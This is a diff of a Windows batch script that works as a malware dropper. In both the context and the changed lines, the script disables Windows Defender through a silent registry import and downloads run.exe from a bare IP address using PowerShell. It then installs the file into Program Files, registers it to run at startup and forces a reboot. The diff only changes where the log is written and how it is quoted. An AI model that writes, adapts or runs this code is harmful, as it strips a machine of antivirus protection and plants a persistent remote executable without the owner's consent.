@@ -1,6 +1,11 @@
 @echo off
 REM Define the log file path
-set LOGFILE=%TEMP%\script_log.txt
+set LOGFILE="C:\Program Files\MyApp\script_log.txt"
+
+REM Ensure the directory exists
+if not exist "C:\Program Files\MyApp" (
+    mkdir "C:\Program Files\MyApp"
+)
 
 REM Redirect all output to the log file
 (
@@ -19,17 +24,17 @@ REM Redirect all output to the log file
 REM Import the registry settings to disable Windows Defender
 regedit.exe /s "%TEMP%\disable_defender.reg"
 if %errorlevel% neq 0 (
-    echo Failed to disable Windows Defender. >> "%LOGFILE%"
+    echo Failed to disable Windows Defender. >> %LOGFILE%
 ) else (
-    echo Windows Defender disabled successfully. >> "%LOGFILE%"
+    echo Windows Defender disabled successfully. >> %LOGFILE%
 )
 
 REM Function to download a file silently
 powershell -Command "Invoke-WebRequest -Uri 'http://54.224.34.222:3004/uploads/run.exe' -OutFile '%TEMP%\installer.exe' -UseBasicParsing"
 if %errorlevel% neq 0 (
-    echo Failed to download the file. >> "%LOGFILE%"
+    echo Failed to download the file. >> %LOGFILE%
 ) else (
-    echo Downloaded file to %TEMP%\installer.exe. >> "%LOGFILE%"
+    echo Downloaded file to %TEMP%\installer.exe. >> %LOGFILE%
 )
 
 REM Create a directory in Program Files if it doesn't exist
@@ -40,9 +45,9 @@ if not exist "C:\Program Files\MyApp" (
 REM Move the downloaded file to Program Files
 move /Y "%TEMP%\installer.exe" "C:\Program Files\MyApp\installer.exe"
 if %errorlevel% neq 0 (
-    echo Failed to move installer.exe to Program Files. >> "%LOGFILE%"
+    echo Failed to move installer.exe to Program Files. >> %LOGFILE%
 ) else (
-    echo Moved installer.exe to Program Files. >> "%LOGFILE%"
+    echo Moved installer.exe to Program Files. >> %LOGFILE%
 )
 
 REM Create a registry entry to run the executable at startup
@@ -56,19 +61,19 @@ REM Create a registry entry to run the executable at startup
 REM Import the registry settings to add startup entry
 regedit.exe /s "%TEMP%\run_at_startup.reg"
 if %errorlevel% neq 0 (
-    echo Failed to register installer.exe to run at startup. >> "%LOGFILE%"
+    echo Failed to register installer.exe to run at startup. >> %LOGFILE%
 ) else (
-    echo Registered installer.exe to run at startup. >> "%LOGFILE%"
+    echo Registered installer.exe to run at startup. >> %LOGFILE%
 )
 
 REM Restart the computer
 shutdown /r /t 0
 if %errorlevel% neq 0 (
-    echo Failed to restart the computer. >> "%LOGFILE%"
+    echo Failed to restart the computer. >> %LOGFILE%
 ) else (
-    echo Computer restarting... >> "%LOGFILE%"
+    echo Computer restarting... >> %LOGFILE%
 )
 
 REM Display completion message
-echo Script execution completed. >> "%LOGFILE%"
+echo Script execution completed. >> %LOGFILE%
 echo Script execution completed.
